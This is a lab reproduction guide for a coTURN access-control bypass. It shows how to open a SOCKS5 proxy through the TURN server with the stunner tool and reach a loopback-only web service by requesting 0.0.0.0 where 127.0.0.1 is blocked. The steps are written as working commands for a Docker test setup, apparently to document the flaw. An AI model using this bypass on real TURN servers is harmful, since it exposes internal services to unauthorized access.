# Scenario 5: Access Bypass
### Description
In this scenario, after creating a socks5 proxy to the TURN server, it is possible using specific HTTP GET requests to access the loopback interface of the server.

### How to reproduce the issue
Before starting containers, install the dependencies for the NodeJS server using:
```bash
npm i fs express https socket.io
```
Then start the containers with:
```bash
docker compose up -d --build
```
The behavior of the <i>coTURN</i> server is observed with:
```bash
docker logs coturn --follow
```

Access the <i>stunner</i> container:
```bash
docker exec -it stunner sh
```
and create a socks5 proxy with:
```bash
stunner socks --turnserver 203.0.113.10:3478 --protocol tcp --username username1 --password password1 --listen 203.0.113.4:9999
```
This command creates a `socks5` server connected to the TURN server (`turnserver`). It uses TCP as the protocol and the same credentials used to start the coTURN server; it listens on `203.0.113.4:9999`.

A web server is created on the coTURN container on the loopback interface:
```bash
python3 -m http.server 8000 --bind 127.0.0.1
```

By performing a GET request to the server on the loopback interface through the proxy:
```
curl -x socks5h://203.0.113.4:9999 http://127.0.0.1:8000
```
the request is blocked (coTURN blocks requests toward loopback addresses). However, by using the IP `0.0.0.0`, a communication can be established and the web services become accessible:
```
curl -x socks5h://203.0.113.4:9999 http://0.0.0.0:8000
```